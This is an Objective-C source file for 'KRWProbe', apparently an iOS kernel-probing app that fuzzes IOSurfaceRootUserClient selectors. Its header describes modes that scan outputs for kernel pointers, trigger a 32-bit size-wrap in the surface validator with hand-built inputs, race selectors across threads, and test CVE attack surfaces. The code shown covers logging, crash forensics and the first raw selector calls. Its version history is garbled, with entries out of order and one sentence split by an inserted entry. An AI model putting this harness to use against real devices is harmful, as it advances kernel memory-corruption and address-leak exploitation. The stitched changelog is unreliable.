// main.m — KRWProbe 1.8 — iOS 27.2 kernel-probe harness + IOSurface property fuzzer
// Target: iPhone14,7 / iOS 27.2 (24B115)
// Every log line is a real API result; no simulated output.
//
// CREATE : raw IOSurfaceRootUserClient dispatch (IOUserClient2022, 60-entry
//          table).  sel 0 creates a surface from an XML plist and the surface
//          id is read from IOSurfaceInfo+0x18; sel 2/3/9/10/11/1 are then
//          called with the exact scalar/struct shapes from DISPATCHER_RE.md.
//
// SAFE   : reports what a sandboxed app can reach (IOSurface user client, AVE,
//          ANE, AGX) and basic surface geometry.
// AGGR   : a few hand-built compressed-plane configs that overflow the
//          32-bit (dataPerSlice + headerPerSlice) * sliceCount product.
// FUZZ   : structured random IOSurfaceCreate() over the compressed-plane
//          property space.  The full config is written to last_config.json
//          before each attempt, so after a kernel panic the exact input
//          survives in the app container.
// MUTATE : (1.1) structured mutation fuzzer over the *raw sel 0* path.  The
//          base is the known-good 64x64 BGRA plist plus one valid plane and
//          a valid AGX-style compressed-plane baseline (tile 32x32, 2x2
//          tiles, 8-byte tile headers, 16 KiB data region).  1-3 fields are
//          replaced per iteration with boundary values; the exact XML +
//          iteration number is written to last_config.xml before every
//          IOConnectCallMethod(sel 0).  Connections are recycled every 64
//          iterations so client-owned surfaces cannot exhaust memory.
// HARD   : (1.2) three aggressive phases over the verified raw path:
//          geometry matrix (all compressed fields over boundary values, one at
//          a time + CT x field + selected pairs), struct-shape abuse of sel
//          2/3/9/10/11 (sizes 0..0x200, scalar counts 0..4), and a 30-second
//          multi-thread race on sel 2/3/9/10/11 plus surface churn.  The last
//          action is in last_action.json, the last geometry XML in
//          last_config.xml.
//
// 1.3    : HARD crashed the process (no HARD line ever reached the log).
//          Fixes: one lock around the shared log string (it was mutated on the
//          worker thread while the main thread copied it into UITextView and
//          while scrollRangeToVisible used a stale length), coalesced UI
//          updates, bounded log volume in the struct matrix, every HARD
//          buffer is heap-allocated once and every length is clamped to the
//          buffer capacity (structOut cap is IOSURFACE_INFO_SIZE = 0xc68),
//          snprintf results are clamped, the race action file is rate-limited,
//          and a phase marker is set *before* each phase.  Each launch writes
//          <Documents>/KRWProbe-yyyyMMdd-HHmmss/{run.log,last_config.xml,
//          last_action.json}; the path is shown at the top of the screen.
// 1.4    : the run folder was invisible in Files because Info.plist lacked
//          UIFileSharingEnabled and LSSupportsOpeningDocumentsInPlace.  Both
//          keys are now present.  run_setup() still runs in main() before any
//          UI; it creates the folder + all five files in Documents AND the
//          same set in NSTemporaryDirectory(), verifies each file exists,
//          reports createDirectoryAtPath:/fopen NSErrors both in run.log and
//          on screen, and the UI shows both paths.
// 1.5    : HARD died at geometry ct-pair 2467/2496 in every run.  The input at
//          that index is CT=4 + IOSurfaceAllocSize=0x40000000 (1 GiB); the
//          same pair had already succeeded in the singles sweep (created
//          count 144->147 over the last 22 singles: 65535, 65536 and 1 GiB).
//          The process, not the kernel, dies: run 165201 stopped at 16:52:32
//          and the next run folder was created at 16:52:47, far too fast for
//          a panic reboot.  HARD has no idea it is about to ask for a second
//          gigabyte and no release path (sel 1 cannot release sel-0 surfaces),
//          so the kernel's IOSurface pool pushes the app over its jetsam
//          limit and it is SIGKILLed inside the sel 0 call.
//          Fixes: (a) every HARD geometry request clamps IOSurfaceAllocSize
//          to alloc_cap (default 64 MiB), (b) the HARD connection is recycled
//          whenever the live surface bytes for that connection exceed 256 MiB,
//          so big surfaces are destroyed deterministically, (c) HARD is
//          resumable from <Documents>/KRWProbe-hard.txt (phase/stage/index/
//          alloc_cap) and writes <Documents>/KRWProbe-progress.txt before
//          every call group, and (d) the current stage + index is logged
//          before each group, not only every 100 calls.
// 1.6    : LEAK mode.  The 1.5 HARD race reported 255047 "kernel-like pointer"
//          hits in sel 10 outputs (first 0xffffffff84000040, sel=10).  LEAK
//          creates one sel-0 surface, sets LEAKKEY with sel 9, then reads it
//          back with sel 10: 200000 single-threaded iterations first, then
//          4 x 200000 iterations with a concurrent sel 9/sel 11 churn thread,
//          then a 20000-iteration pass that also captures scalarOutput.
//          Every structOut (and scalarOut) is scanned at 4-byte offsets for
//          64-bit values whose top bits are 0xffffff/0xffffffff.  Each hit
//          dumps iteration, thread, selector, output size, the first 128 bytes
//          of structOut, every matching 64-bit value with offset/alignment,
//          and whether it is inside the unslid kernel text/data range
//          [0xfffffff007004000,0xfffffff00aa78000] or in 0xffffffff8...
//          (sign-extended 32-bit) - to <Documents>/<run>/leak.txt (append +
//          flush) and the on-screen log.  Dumps are capped at 200 records and
//          the raw 0xc68 CREATE response header (first 0x98 bytes) is dumped
//          first for reference.
// 1.7    : F1 mode.  One hand-built sel 0 per variant for the multi-slice
//          compressed-plane 32-bit wrap (VALIDATOR_AUDIT.md F1):
//          (DataRegionBytesPerSlice + HeaderRegionBytesPerSlice) * SliceCount
//          is checked in 32 bits, so 4 x (0x4000 + 0x40000000) wraps to
//          0x10000 and passes a 0x10000 plane-size check while the true region
//          is 4 GiB + 64 KiB.  Variants: sliceCount=0x80000004, header=
//          0x80000000/sliceCount=2, planeSize=0x20000.  Each successful CREATE
//          dumps the full 0xc68 IOSurfaceInfo (first 0x200 bytes + every
//          non-zero u32), then sel 2 and sel 10 for IOSurfaceWidth /
//          IOSurfaceSliceCount - to <run>/f1.txt and run.log.
// 1.9    : SELSCAN + GATES.  Every one of the 60 sMethods selectors is now
//          probed with the exact counts from the dispatch table (DISPATCHER_RE.md),
//          each response is dumped and scanned for kernel-range pointers; the
//          GATES button sweeps IOServiceOpen client types 0-8 for AGX and AVE2
//          to split sandbox refusal from client-type refusal.  Probe paths,
// 2.0    : PATH-A for 26.6.x: ROUTE (PF_ROUTE RTM_ADD with AF_LINK gateway
//          whose sdl_alen exceeds sdl_len - CVE-2026-112507 fix status test)
//          and NECP (necp_open/necp_client_action reachability - the
//          CVE-2026-112665 DATA-TRACE surface).  Everything else unchanged.
//          log files and every 1.7/1.8 action unchanged.
// 1.8    : UI-only redesign (dark-slate grouped cards, responsive Auto Layout,
//          spring press feedback, animated phase label, smooth log follow,
//          Credits sheet with GitHub/Telegram links).  Probe paths, log files,
//          phase markers, last_action/last_config writes and every action are
//          unchanged from 1.7.

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
// The iOS SDK ships a stub mach/mach_vm.h; declare the one symbol we need.
extern kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address,
                                    mach_vm_size_t *size, vm_region_flavor_t flavor,
                                    vm_region_info_t info, mach_msg_type_number_t *infoCnt,
                                    mach_port_t *object_name);
#import <mach/mach_time.h>
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>

// ---- IOSurface private API (not in the public SDK) ----
typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID cid);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef buffer);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern size_t IOSurfaceGetBytesPerElement(IOSurfaceRef buffer);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef buffer);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef buffer);
extern size_t IOSurfaceGetBytesPerRowOfPlane(IOSurfaceRef buffer, size_t planeIndex);
extern size_t IOSurfaceGetHeightOfPlane(IOSurfaceRef buffer, size_t planeIndex);
extern void IOSurfaceSetValue(IOSurfaceRef buffer, CFStringRef key, CFTypeRef value);
extern void IOSurfaceRemoveValue(IOSurfaceRef buffer, CFStringRef key);
extern kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);

static NSMutableString *gLog;
static UITextView *gView;
static UILabel *gPhaseLabel;
static UILabel *gPathLabel;
static UILabel *gErrorLabel;
static volatile int gStop;
static volatile int gMutateBusy;
static volatile int gHardBusy;
static NSString *gLastPath;
static NSString *gMutatePath;
static NSString *gActionPath;
static NSString *gRunDir;            // active: Documents, else tmp
static NSString *gRunDirDocs;        // created <Documents>/KRWProbe-<stamp>/ (nil on failure)
static NSString *gRunDirTemp;        // created <NSTemporaryDirectory()>/KRWProbe-<stamp>/
static NSString *gRunDirTmp;         // mirror dir, nil when identical to gRunDir
static NSString *gRunLogPath;
static NSString *gRunLogPathTmp;
static NSString *gLastPathTmp;
static NSString *gMutatePathTmp;
static NSString *gActionPathTmp;
static NSString *gLastPhasePath;
static NSString *gLastPhasePathTmp;
static NSString *gRunSetupError;     // non-nil => shown on screen in red
static NSString *gHardCfgPath;       // <Documents>/KRWProbe-hard.txt (survives runs)
static NSString *gRtCfgPath;         // <Documents>/KRWProbe-route.txt (survives runs)
static NSString *gHardProgressPath;  // <Documents>/KRWProbe-progress.txt
static NSString *gLeakPath;          // <Documents>/<run>/leak.txt (LEAK dumps)
static NSString *gLeakPathTmp;       // tmp mirror of leak.txt
static FILE *gRunFile;
static FILE *gRunFileTmp;
static NSLock *gLogLock;
static volatile int gUiPending;
static NSString *gPhase;                 // main-thread copy of the phase label

// 128 KiB of scrollback is plenty; trimming keeps the text view copy bounded.
#define LOG_SOFT_MAX  131072
#define LOG_KEEP_MAX   65536

// The log string is touched by every worker and copied by the main thread.
// The lock makes "append + trim" atomic and the UI only ever receives an
// immutable snapshot, so UITextView can never observe a half-mutated string.
static void log_ui_flush(NSString *snapshot) {
    if (!gView || snapshot.length == 0) return;

    // Follow the tail only when the operator is already at the bottom, so
    // scrolling back to inspect an earlier hit is not fought by the updater.
    CGFloat visibleBottom = gView.contentOffset.y + CGRectGetHeight(gView.bounds);
    BOOL follow = (gView.contentSize.height <= CGRectGetHeight(gView.bounds) + 1.0) ||
                  (visibleBottom >= gView.contentSize.height - 34.0);

    gView.text = snapshot;
    if (!follow) return;

    // Let UITextView finish its glyph layout, then glide to the new tail.
    dispatch_async(dispatch_get_main_queue(), ^{
        if (!gView) return;
        [gView layoutIfNeeded];
        CGFloat bottom = gView.contentSize.height - CGRectGetHeight(gView.bounds) +
                         gView.contentInset.bottom;
        if (bottom < -gView.contentInset.top) bottom = -gView.contentInset.top;
        [UIView animateWithDuration:0.18
                              delay:0
                            options:UIViewAnimationOptionBeginFromCurrentState |
                                    UIViewAnimationOptionAllowUserInteraction |
                                    UIViewAnimationOptionCurveEaseOut
                         animations:^{
            [gView setContentOffset:CGPointMake(0, bottom) animated:NO];
        } completion:nil];
    });
}

// Every forensic file exists twice: Documents (visible in Files when the
// Info.plist keys are set) and NSTemporaryDirectory() (always writable, no
// sharing required).  If the two paths are identical (Documents failed and
// tmp became primary) the second write is skipped by passing p2 == nil.
static void write_both(NSString *text, NSString *p1, NSString *p2) {
    if (!text) return;
    if (p1) [text writeToFile:p1 atomically:YES
                    encoding:NSUTF8StringEncoding error:nil];
    if (p2) [text writeToFile:p2 atomically:YES
                    encoding:NSUTF8StringEncoding error:nil];
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (!s) s = @"(log format failed)";

    BOOL schedule = NO;
    [gLogLock lock];
    if (gLog) {
        [gLog appendFormat:@"%@\n", s];
        if (gLog.length > LOG_SOFT_MAX) {
            NSUInteger cut = gLog.length - LOG_KEEP_MAX;
            if (cut > 0 && cut < gLog.length) [gLog deleteCharactersInRange:NSMakeRange(0, cut)];
        }
    }
    const char *u = s.UTF8String;
    if (u) {
        size_t n = strlen(u);
        FILE *f = gRunFile;
        if (f) {
            if (n) fwrite(u, 1, n, f);
            fputc('\n', f);
            fflush(f);                 // every line hits disk before the next call
        }
        f = gRunFileTmp;               // identical content in the tmp mirror
        if (f) {
            if (n) fwrite(u, 1, n, f);
            fputc('\n', f);
            fflush(f);
        }
    }
    if (gView && !gUiPending) { gUiPending = 1; schedule = YES; }
    [gLogLock unlock];

    NSLog(@"[KRWProbe] %@", s);

    if (schedule) {
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *snap = nil;
            [gLogLock lock];
            if (gLog) snap = [gLog copy];
            gUiPending = 0;            // a later line may schedule another flush
            [gLogLock unlock];
            log_ui_flush(snap);
        });
    }
}

static void phase_set_main(NSString *p) {
    NSString *next = p.length ? p : @"idle";
    BOOL changed = ![gPhase isEqualToString:next];
    gPhase = [next copy];
    if (!gPhaseLabel) return;
    if (!changed) return;

    gPhaseLabel.text = gPhase;
    // A soft cross-fade reads as a live instrument, while the small upward
    // spring keeps the label from looking like a plain text swap.
    CATransition *fade = [CATransition animation];
    fade.type = kCATransitionFade;
    fade.duration = 0.22;
    fade.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
    [gPhaseLabel.layer addAnimation:fade forKey:@"krw.phase.fade"];

    if (!UIAccessibilityIsReduceMotionEnabled()) {
        gPhaseLabel.transform = CGAffineTransformMakeTranslation(0, 4);
        [UIView animateWithDuration:0.38
                              delay:0
             usingSpringWithDamping:0.82
              initialSpringVelocity:0.4
                            options:UIViewAnimationOptionAllowUserInteraction |
                                    UIViewAnimationOptionBeginFromCurrentState
                         animations:^{
            gPhaseLabel.transform = CGAffineTransformIdentity;
        } completion:nil];
    }
}

// Must be called BEFORE the work of a phase: the label therefore always names
// the phase that was running when the process died.  Also persisted to
// last_phase.txt, because the UI dies with the process.
static void set_phase(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *p = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (!p) return;
    if ([NSThread isMainThread]) {
        phase_set_main(p);
    } else {
        dispatch_sync(dispatch_get_main_queue(), ^{ phase_set_main(p); });
    }
    if (gLastPhasePath || gLastPhasePathTmp) {
        write_both(p, gLastPhasePath, gLastPhasePathTmp);
    }
    L(@"[PHASE] %@", p);
}

static NSString *sysctl_str(const char *name) {
    char buf[512] = {0}; size_t len = sizeof(buf) - 1;
    if (sysctlbyname(name, buf, &len, NULL, 0) != 0) return @"?";
    return [NSString stringWithUTF8String:buf];
}

static NSString *kern_version(void) {
    char buf[1024] = {0}; size_t len = sizeof(buf) - 1;
    if (sysctlbyname("kern.version", buf, &len, NULL, 0) != 0) return @"?";
    return [NSString stringWithUTF8String:buf];
}

static NSString *io_open(NSString *cls) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching(cls.UTF8String));
    if (!svc) return [NSString stringWithFormat:@"%@: no service", cls];
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    NSString *r = [NSString stringWithFormat:@"%@: kr=0x%x (%u) %s", cls, kr, kr,
                   kr == KERN_SUCCESS ? "OK" : "not-permitted-or-error"];
    if (kr == KERN_SUCCESS) IOServiceClose(conn);
    IOObjectRelease(svc);
    return r;
}

static NSDictionary *base_props(uint32_t w, uint32_t h) {
    return @{ @"IOSurfaceWidth": @(w), @"IOSurfaceHeight": @(h),
              @"IOSurfaceBytesPerElement": @(4),
              @"IOSurfacePixelFormat": @(0x42475241) };
}

// ---- IOSurfaceRootUserClient: raw IOConnectCallMethod dispatch ----
// Table: IOUserClient2022::dispatchExternalMethod, 60 entries @ 0xfffffff008068b90.
// IOSurfaceInfo layout, from dumps/ios272/fn_fffffff009c2c18c.c:
//   +0x18 u32 id        (*(u32 *)(surface + 0x38))
//   +0x58 u32 planes    min(plane_count, 0x14)
//   +0x5c u8  flag
//   +0x64 u32 pixel format
//   +0x68 u32 use count (overwritten by sel 2)
//   +0x88 planes[20], stride 0x98  ->  0x88 + 20*0x98 = 0xc68
#define IOSURFACE_INFO_SIZE       0xc68u
#define IOSURFACE_INFO_ID_OFF     0x18u
#define IOSURFACE_INFO_PLANES_OFF 0x58u
#define IOSURFACE_INFO_FLAG_OFF   0x5cu
#define IOSURFACE_INFO_PIXFMT_OFF 0x64u
#define IOSURFACE_INFO_USECNT_OFF 0x68u

static uint32_t rd32(const uint8_t *p) {
    uint32_t v; memcpy(&v, p, sizeof(v)); return v;
}

static NSString *hexdump_lines(const uint8_t *p, size_t n) {
    if (!p) return @"(null)";
    if (n > 0x200) n = 0x200;                       // never format more than 512 bytes
    NSMutableString *s = [NSMutableString stringWithCapacity:n * 4 + 16];
    for (size_t i = 0; i < n; i += 16) {
        [s appendFormat:@"  +0x%03zx:", i];
        for (size_t j = 0; j < 16 && i + j < n; j++) [s appendFormat:@" %02x", p[i + j]];
        [s appendString:@"\n"];
    }
    return s;
}

// sel 0 structureInput: OSUnserialize() parses the property dictionary.  The
// kernel only takes the XML branch when the last byte of the buffer is NUL
// (dumps/fn_fffffff00a8d8754.c: `param_1[param_2 - 1] == '\0'`).
static NSString *create_surface_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\"><dict>"
            "<key>IOSurfaceWidth</key><integer>64</integer>"
            "<key>IOSurfaceHeight</key><integer>64</integer>"
            "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
            "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>" // 0x42475241 'BGRA'
            "</dict></plist>\n";
}

// sel 9 structureInput payload (after the 0xc header): [value, key].
static NSString *set_value_xml(void) {
    return @"<plist version=\"1.0\"><array>"
            "<integer>1</integer><string>KRWProbeValue</string>"
            "</array></plist>";
}

// Read at most 256 KiB: the "last config" files must never turn a log line
// into an unbounded allocation after an aggressive run.
#define READ_CAP 262144
static NSString *read_capped(NSString *path) {
    if (path.length == 0) return nil;
    NSData *d = [NSData dataWithContentsOfFile:path options:0 error:nil];
    if (!d) return nil;
    if (d.length > READ_CAP) d = [d subdataWithRange:NSMakeRange(0, READ_CAP)];
    NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    return s ?: [NSString stringWithFormat:@"(binary, %lu bytes)", (unsigned long)d.length];
}

// One folder per launch: <Documents>/KRWProbe-yyyyMMdd-HHmmss/
static NSString *run_stamp(void) {
    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    df.timeZone = [NSTimeZone localTimeZone];
    df.dateFormat = @"yyyyMMdd-HHmmss";
    return [df stringFromDate:[NSDate date]];
}

static NSString *app_version(void) {
    NSString *v = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
    return v.length ? v : @"?";
}

// Create <parent>/KRWProbe-<stamp>/ (or -pid on collision).  Returns nil and
// fills *outErr on failure, so the exact NSError can be shown on screen.
static NSString *run_make_dir(NSString *parent, NSString *base, NSError **outErr) {
    if (parent.length == 0) {
        if (outErr) *outErr = [NSError errorWithDomain:@"KRWProbe"
                                                  code:1
                                              userInfo:@{NSLocalizedDescriptionKey:
                                                             @"empty parent directory"}];
        return nil;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dir = [parent stringByAppendingPathComponent:base];

    // createDirectoryAtPath: with intermediates returns YES for an existing
    // directory, so check first: two launches in one second must not share a
    // run.log.
    if ([fm fileExistsAtPath:dir]) {
        dir = [parent stringByAppendingPathComponent:
               [base stringByAppendingFormat:@"-%d", (int)getpid()]];
    }
    for (int i = 0; i < 8 && [fm fileExistsAtPath:dir]; i++) {
        dir = [parent stringByAppendingPathComponent:
               [base stringByAppendingFormat:@"-%d-%d", (int)getpid(), i + 1]];
    }

    NSError *err = nil;
    if (![fm createDirectoryAtPath:dir withIntermediateDirectories:YES
                        attributes:nil error:&err]) {
        if (outErr) *outErr = err;
        return nil;
    }
    return dir;
}

static void run_setup(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *errors = [NSMutableArray array];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    NSString *base = [NSString stringWithFormat:@"KRWProbe-%@", run_stamp()];

    NSError *err = nil;
    NSString *docsDir = run_make_dir(docs, base, &err);
    if (!docsDir) {
        [errors addObject:[NSString stringWithFormat:@"Documents create failed: %@",
                           err.localizedDescription ?: @"unknown error"]];
    }
    err = nil;
    NSString *tmpDir = run_make_dir(NSTemporaryDirectory(), base, &err);
    if (!tmpDir) {
        [errors addObject:[NSString stringWithFormat:@"tmp create failed: %@",
                           err.localizedDescription ?: @"unknown error"]];
    }

    gRunDirDocs = [docsDir copy];
    gRunDirTemp = [tmpDir copy];

    if (!docsDir && !tmpDir) {
        // Neither location is writable: keep the intended paths for display,
        // but there is no log file.
        gRunDir = [docs stringByAppendingPathComponent:base];
        gRunDirTmp = nil;
        gRunSetupError = [errors componentsJoinedByString:@" | "];
        L(@"=== KRWProbe %@ ===", app_version());
        L(@"[ERROR] run folder NOT created: %@", gRunSetupError);
        return;
    }

    gRunDir = [(docsDir ?: tmpDir) copy];
    gRunDirTmp = ([docsDir length] && [tmpDir length] &&
                  ![tmpDir isEqualToString:docsDir]) ? [tmpDir copy] : nil;

    gRunLogPath = [gRunDir stringByAppendingPathComponent:@"run.log"];
    gLastPath = [gRunDir stringByAppendingPathComponent:@"last_config.json"];
    gMutatePath = [gRunDir stringByAppendingPathComponent:@"last_config.xml"];
    gActionPath = [gRunDir stringByAppendingPathComponent:@"last_action.json"];
    gLastPhasePath = [gRunDir stringByAppendingPathComponent:@"last_phase.txt"];
    gLeakPath = [gRunDir stringByAppendingPathComponent:@"leak.txt"];
    // Stable HARD resume config/progress live in Documents (not in the
    // per-run folder) so they survive a relaunch and can be edited in Files.
    if (docs.length) {
        gHardCfgPath = [docs stringByAppendingPathComponent:@"KRWProbe-hard.txt"];
        gRtCfgPath = [docs stringByAppendingPathComponent:@"KRWProbe-route.txt"];
        gHardProgressPath = [docs stringByAppendingPathComponent:@"KRWProbe-progress.txt"];
    }
    if (gRunDirTmp) {
        gRunLogPathTmp = [gRunDirTmp stringByAppendingPathComponent:@"run.log"];
        gLastPathTmp = [gRunDirTmp stringByAppendingPathComponent:@"last_config.json"];
        gMutatePathTmp = [gRunDirTmp stringByAppendingPathComponent:@"last_config.xml"];
        gActionPathTmp = [gRunDirTmp stringByAppendingPathComponent:@"last_action.json"];
        gLastPhasePathTmp = [gRunDirTmp stringByAppendingPathComponent:@"last_phase.txt"];
        gLeakPathTmp = [gRunDirTmp stringByAppendingPathComponent:@"leak.txt"];
    }

    gRunFile = fopen(gRunLogPath.fileSystemRepresentation, "a");
    if (gRunFile) {
        setvbuf(gRunFile, NULL, _IOLBF, 0);
    } else {
        [errors addObject:[NSString stringWithFormat:@"fopen %@ failed: %s",
                           gRunLogPath, strerror(errno)]];
    }
    if (gRunLogPathTmp) {
        gRunFileTmp = fopen(gRunLogPathTmp.fileSystemRepresentation, "a");
        if (gRunFileTmp) {
            setvbuf(gRunFileTmp, NULL, _IOLBF, 0);
        } else {
            [errors addObject:[NSString stringWithFormat:@"fopen %@ failed: %s",
                               gRunLogPathTmp, strerror(errno)]];
        }
    }

    // The folders must contain all five files from the first second, even if
    // the app dies before the first user action.  Same bytes in both places.
    NSString *plainXml = create_surface_xml();
    NSString *idleAction = @"{\"mode\":\"idle\",\"note\":\"no action yet\"}";
    write_both(plainXml, gMutatePath, gMutatePathTmp);
    write_both(idleAction, gActionPath, gActionPathTmp);
    write_both(@"{}", gLastPath, gLastPathTmp);
    write_both(@"launch", gLastPhasePath, gLastPhasePathTmp);
    write_both(@"# KRWProbe leak.txt - LEAK dumps are appended here\n",
               gLeakPath, gLeakPathTmp);

    // 1.5: drop a commented resume template in Documents once.  The operator
    // edits this file in Files to start HARD at a specific phase/stage/index.
    if (gHardCfgPath && ![fm fileExistsAtPath:gHardCfgPath]) {
        NSString *tpl =
            @"# KRWProbe HARD resume config (1.5)\n"
            @"# phase: 0=geometry 1=struct 2=race\n"
            @"# stage: singles | ct-pair | pair (geometry only)\n"
            @"# index: first index to execute in that stage (inclusive)\n"
            @"# alloc_cap: max IOSurfaceAllocSize HARD may request, bytes\n"
            @"phase=0\n"
            @"stage=singles\n"
            @"index=0\n"
            @"alloc_cap=67108864\n";
        [tpl writeToFile:gHardCfgPath atomically:YES
                encoding:NSUTF8StringEncoding error:NULL];
    }

    // Explicitly verify creation instead of trusting createDirectoryAtPath:.
    NSArray<NSString *> *required = @[ @"run.log", @"last_config.xml",
                                       @"last_action.json", @"last_phase.txt",
                                       @"leak.txt" ];
    for (NSString *name in required) {
        NSString *p = [gRunDir stringByAppendingPathComponent:name];
        if (![fm fileExistsAtPath:p]) {
            [errors addObject:[NSString stringWithFormat:@"missing %@", p]];
        }
        if (gRunDirTmp) {
            NSString *t = [gRunDirTmp stringByAppendingPathComponent:name];
            if (![fm fileExistsAtPath:t]) {
                [errors addObject:[NSString stringWithFormat:@"missing %@", t]];
            }
        }
    }

    if (errors.count) gRunSetupError = [errors componentsJoinedByString:@" | "];

    L(@"=== KRWProbe %@ ===", app_version());
    L(@"Documents run dir: %@", gRunDirDocs ?: @"FAILED");
    L(@"tmp run dir: %@", gRunDirTemp ?: @"FAILED");
    L(@"active run dir: %@", gRunDir);
    L(@"tmp mirror: %@", gRunDirTmp ?: @"(none)");
    L(@"run log: %@ (flushed after every line)", gRunLogPath);
    if (gRunSetupError) {
        L(@"[ERROR] run setup: %@", gRunSetupError);
    } else {
        L(@"run folder verified: run.log, last_config.xml, last_action.json, "
          @"last_phase.txt, leak.txt present in all created locations");
    }
}

static void probe_create(void) {
    L(@"=== KRWProbe %@ CREATE (IOSurfaceRootUserClient) ===", app_version());
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"create: no IOSurfaceRoot service"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        L(@"create: IOServiceOpen kr=0x%x (%u) %s", kr, kr, "FAIL");
        return;
    }
    L(@"create: IOServiceOpen OK conn=%u", conn);

    // ---- sel 0: CREATE ----
    // scalarIn = 1 (u32 parent id, high 32 bits must be 0)
    // structIn = serialized property plist (XML text + NUL)
    // scalarOut = 0, structOut = exactly 0xc68
    set_phase(@"CREATE sel0 chain");
    NSString *xml = create_surface_xml();
    const char *xmlc = xml.UTF8String;
    size_t xmlLen = xmlc ? strlen(xmlc) + 1 : 0;   // include terminating NUL
    uint64_t scIn[1] = { 0 };               // parent id = 0
    uint8_t *info = (uint8_t *)calloc(1, IOSURFACE_INFO_SIZE);
    size_t infoSize = IOSURFACE_INFO_SIZE;
    if (!info) { L(@"create: info alloc failed"); IOServiceClose(conn); return; }

    L(@"sel0: scalarIn=1 {parent=0}, structIn=%zu (XML+NUL), scalarOut=0, structOut=0xc68", xmlLen);
    kr = IOConnectCallMethod(conn, 0, scIn, 1, xmlc, xmlLen, NULL, NULL, info, &infoSize);
    L(@"sel0 CREATE -> kr=0x%x (%u) %s, structOut=%zu/0xc68",
      kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", infoSize);

    if (kr != KERN_SUCCESS) {
        L(@"sel0: no surface id, skipping sel 2/3/9/10/11/1");
        free(info);
        IOServiceClose(conn);
        return;
    }

    uint32_t sid = rd32(info + IOSURFACE_INFO_ID_OFF);
    L(@"sel0: surface id=%u (u32 at info+0x%x)", sid, IOSURFACE_INFO_ID_OFF);
    L(@"sel0: planes=%u (+0x58) flag=%u (+0x5c) pixfmt=0x%08x (+0x64) usecnt=%u (+0x68)",
      rd32(info + IOSURFACE_INFO_PLANES_OFF), info[IOSURFACE_INFO_FLAG_OFF],
      rd32(info + IOSURFACE_INFO_PIXFMT_OFF), rd32(info + IOSURFACE_INFO_USECNT_OFF));
    L(@"sel0: IOSurfaceInfo[0x00..0x90]:\n%@", hexdump_lines(info, 0x90));

    // ---- sel 2: use-count/state + full IOSurfaceInfo ----
    // structIn exactly 0xc {u32 id; u32 flags; u32 pad}; structOut 0xc68.
    struct { uint32_t id; uint32_t flags; uint32_t pad; } in2 = { sid, 0, 0 };
    memset(info, 0xaa, IOSURFACE_INFO_SIZE);
    infoSize = IOSURFACE_INFO_SIZE;
    kr = IOConnectCallMethod(conn, 2, NULL, 0, &in2, sizeof(in2), NULL, NULL, info, &infoSize);
    L(@"sel2 USE+INFO -> kr=0x%x (%u) %s, structIn=%zu structOut=%zu/0xc68",
      kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", sizeof(in2), infoSize);
    if (kr == KERN_SUCCESS) {
        L(@"sel2: id=%u usecnt=%u (+0x68) planes=%u",
          rd32(info + IOSURFACE_INFO_ID_OFF), rd32(info + IOSURFACE_INFO_USECNT_OFF),
          rd32(info + IOSURFACE_INFO_PLANES_OFF));
    }

    // ---- sel 3: decrement use-count, 4-byte answer ----
    struct { uint32_t id; uint32_t arg; uint32_t pad; } in3 = { sid, 0, 0 };
    uint32_t out32 = 0;
    size_t out32Size = sizeof(out32);
    kr = IOConnectCallMethod(conn, 3, NULL, 0, &in3, sizeof(in3), NULL, NULL, &out32, &out32Size);
    L(@"sel3 USE- -> kr=0x%x (%u) %s, structIn=0xc structOut=%zu/4 value=%u",
